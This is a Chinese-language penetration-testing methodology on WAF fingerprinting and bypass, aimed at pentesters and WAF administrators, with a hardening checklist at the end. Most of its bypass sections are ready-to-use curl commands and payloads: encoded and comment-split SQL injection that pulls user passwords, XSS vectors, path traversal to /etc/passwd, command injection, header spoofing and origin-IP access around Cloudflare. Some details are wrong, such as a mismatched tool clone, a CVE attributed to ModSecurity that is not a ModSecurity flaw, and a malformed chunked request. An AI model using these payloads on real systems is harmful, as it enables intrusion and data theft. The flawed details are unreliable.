# WAF 配置绕过方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对 Web 应用防火墙（WAF）配置错误的检测与绕过方法论。WAF 配置不当可能导致防护失效，甚至被攻击者利用作为信息收集的工具。

### 1.2 适用范围
- 硬件 WAF：F5、Imperva、Radware
- 云 WAF：AWS WAF、Cloudflare、Azure WAF
- 软件 WAF：ModSecurity、NAXSI、OWASP CRS
- CDN 集成 WAF：Cloudflare、Akamai、Fastly

### 1.3 读者对象
- 渗透测试工程师
- Web 安全分析师
- WAF 管理员
- 应用安全工程师

---

## 第二部分：核心渗透技术专题

### 专题：WAF 配置绕过

#### 2.1 技术介绍

Web 应用防火墙（WAF）配置错误是指 WAF 在部署和配置过程中的不安全设置，可能导致防护规则失效、误报漏报、或被攻击者绕过。

**常见 WAF 配置错误类型：**

| 错误类型 | 描述 | 危害等级 |
|---------|------|---------|
| **规则集过旧** | 使用过时的规则库 | 高 |
| **检测模式宽松** | 仅记录不阻断 | 中 |
| **规则覆盖不足** | 未覆盖关键攻击类型 | 高 |
| **白名单过宽** | 过多 IP/URL 被豁免 | 高 |
| **自定义规则错误** | 自定义规则逻辑错误 | 中 |
| **SSL 卸载配置错误** | 未检查 HTTPS 流量 | 高 |

**常见 WAF 厂商标识：**

| WAF | 响应头特征 | Cookie 特征 |
|-----|-----------|------------|
| **Cloudflare** | CF-Ray, CF-Cache-Status | __cfduid |
| **AWS WAF** | x-amzn-RequestId | - |
| **ModSecurity** | ModSecurity | - |
| **F5** | X-WAF-Request-ID | - |
| **Imperva** | X-Imperva-ID | - |
| **Akamai** | X-Akamai-Transformed | - |

#### 2.2 绕过常见于哪些场景

| 场景 | 风险点描述 |
|-----|-----------|
| **新 WAF 部署** | 规则未调优，存在盲点 |
| **规则更新后** | 新规则与业务冲突被禁用 |
| **业务变更** | 新功能未更新 WAF 规则 |
| **多 WAF 环境** | 不同 WAF 规则不一致 |
| **紧急 bypass** | 临时关闭规则后未恢复 |

#### 2.3 漏洞探测方法

##### 2.3.1 WAF 指纹识别

**1. 响应头检测**

```bash
# 检测 WAF 存在
curl -I http://target/

# 常见 WAF 响应头
# Cloudflare: CF-Ray
# AWS WAF: x-amzn-RequestId
# ModSecurity: ModSecurity
# F5 BIG-IP: X-WAF-Request-ID
```

**2. WAF 识别工具**

```bash
# 使用 whatweb
whatweb http://target/

# 使用 WAF 识别工具
git clone https://github.com/0xInfection/Awesome-WAF
python wafw00f.py http://target/

# 使用 Nmap
nmap --script http-waf-detect target
nmap --script http-waf-fingerprint target
```

**3. 触发 WAF 响应**

```bash
# 发送明显攻击 Payload 触发 WAF
curl http://target/?id=1' OR '1'='1
curl http://target/?page=<script>alert(1)</script>
curl http://target/?file=../../../etc/passwd

# 观察响应
# - 403 Forbidden
# - 406 Not Acceptable
# - 自定义拦截页面
# - 响应延迟增加
```

##### 2.3.2 规则集分析

**1. 探测过滤规则**

```bash
# SQL 注入过滤测试
curl "http://target/?id=1'"           # 单引号
curl "http://target/?id=1%27"         # URL 编码单引号
curl "http://target/?id=1&#39;"       # HTML 实体
curl "http://target/?id=1\x27"        # 十六进制编码

# XSS 过滤测试
curl "http://target/?q=<script>"      # script 标签
curl "http://target/?q=%3Cscript%3E"  # URL 编码
curl "http://target/?q=java<script>"  # 分割标签

# 命令注入测试
curl "http://target/?cmd=;ls"         # 分号
curl "http://target/?cmd=%3Bls"       # URL 编码
curl "http://target/?cmd=|ls"         # 管道
```

**2. 速率限制测试**

```bash
# 测试速率限制配置
for i in {1..100}; do
    curl -s -o /dev/null -w "%{http_code}\n" http://target/
done

# 观察是否触发 429 Too Many Requests
```

#### 2.4 漏洞利用方法（绕过技术）

##### 2.4.1 编码绕过

| 编码类型 | 示例 | 说明 |
|---------|------|------|
| **URL 编码** | `%27` 代替 `'` | 基础编码 |
| **双重 URL 编码** | `%2527` 代替 `%27` | 绕过单层解码 |
| **Unicode 编码** | `\u0027` | Unicode 转义 |
| **HTML 实体** | `&#39;` | HTML 实体编码 |
| **Base64** | `base64_encode` | 整体编码 |
| **十六进制** | `0x27` | 十六进制表示 |

```bash
# URL 编码绕过
curl "http://target/?id=1%27%20OR%20%271%27=%271"

# 双重编码
curl "http://target/?id=1%2527%2520OR%2520%25271%2527=%25271"

# Unicode 规范化绕过
curl "http://target/?q=\u003cscript\u003e"
```

##### 2.4.2 语法变异绕过

**SQL 注入绕过：**

```bash
# 空格绕过
curl "http://target/?id=1'AND'1'='1"
curl "http://target/?id=1%09AND%091=1"      # Tab
curl "http://target/?id=1%0aAND%0a1=1"      # 换行
curl "http://target/?id=1/**/AND/**/1=1"    # 注释

# 关键字绕过
curl "http://target/?id=1' AnD 1=1--"       # 大小写混合
curl "http://target/?id=1' aNd 1=1--"
curl "http://target/?id=1' UN/**/ION SEL/**/ECT--"

# 等价函数替换
curl "http://target/?id=1' AND SUBSTRING((SELECT password FROM users),1,1)='a'--"
curl "http://target/?id=1' AND MID((SELECT password FROM users),1,1)='a'--"
```

**XSS 绕过：**

```bash
# 标签绕过
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">

# 事件处理器绕过
<div onmouseover="alert(1)">test</div>
<input onfocus=alert(1) autofocus>

# JavaScript 编码
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>
```

##### 2.4.3 协议特性绕过

```bash
# HTTP 参数污染
curl "http://target/?id=1&id=' OR '1'='1"

# 分块传输编码
curl -H "Transfer-Encoding: chunked" \
     -d "0d
' OR '1'='1
0" http://target/

# HTTP 方法覆盖
curl -X POST -H "X-HTTP-Method-Override: GET" \
     "http://target/?id=1' OR '1'='1"

# 内容类型绕过
curl -H "Content-Type: text/plain" \
     -d "id=1' OR '1'='1" http://target/
```

##### 2.4.4 逻辑绕过

```bash
# 利用白名单
# 如果 /api/ 在白名单中
curl "http://target/api/../../../etc/passwd"

# 利用 HTTP 头
curl -H "X-Forwarded-For: 127.0.0.1" \
     -H "X-Originating-IP: 127.0.0.1" \
     http://target/admin

# 利用 Cookie
curl -b "admin=true; role=admin" http://target/admin

# 路径遍历变种
curl "http://target/..;/admin"
curl "http://target/..%c0%af..%c0%afetc/passwd"
```

##### 2.4.5 WAF 特定绕过

**Cloudflare 绕过：**

```bash
# 查找源站 IP
# 通过历史 DNS 记录、邮件头等

# 直接访问源站
curl --resolve target.com:80:SOURCE_IP http://target.com/
```

**ModSecurity 绕过：**

```bash
# CVE-2022-31814 (参数污染)
curl "http://target/?param=value1&param=value2"

# 利用规则处理顺序
# 构造特殊 Payload 绕过检测
```

#### 2.5 绕过验证方法

##### 2.5.1 绕过成功指标

| 指标 | 说明 |
|-----|------|
| **响应状态码** | 从 403 变为 200 |
| **响应内容** | 出现预期结果（如数据库错误） |
| **响应时间** | 时间延迟符合预期 |
| **行为差异** | 与无 WAF 环境行为一致 |

##### 2.5.2 自动化绕过工具

```bash
# SQLMap WAF 绕过
sqlmap -u "http://target/?id=1" \
       --tamper=space2comment.py \
       --tamper=charencode.py

# 使用 Burp Suite
# Intruder 模块 + Payload 编码

# 使用 Nuclei
nuclei -t http/waf/ -u target
```

---

## 第三部分：附录

### 3.1 WAF 绕过技术速查

| 攻击类型 | 绕过技术 | 示例 Payload |
|---------|---------|-------------|
| **SQL 注入** | 编码、注释、大小写 | `1'/**/AnD/**/1=1--` |
| **XSS** | 标签变异、编码 | `<img src=x onerror=alert(1)>` |
| **路径遍历** | 编码、变种 | `..%2f..%2fetc/passwd` |
| **命令注入** | 空格绕过、编码 | `cat${IFS}/etc/passwd` |
| **SSRF** | 重定向、DNS | `http://redirector.com` |

### 3.2 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **WAFW00F** | WAF 识别 | `wafw00f http://target` |
| **SQLMap** | SQL 注入 + WAF 绕过 | `sqlmap --tamper` |
| **Burp Suite** | 手动测试 | Intruder + Bypass |
| **Nuclei** | WAF 检测 | `nuclei -t http/waf/` |

### 3.3 WAF 加固建议

- [ ] 保持规则库最新
- [ ] 实施阻断模式（非仅记录）
- [ ] 定期调优和测试规则
- [ ] 限制白名单范围
- [ ] 启用 HTTPS 检查
- [ ] 实施速率限制
- [ ] 配置适当的日志记录
- [ ] 定期进行绕过测试
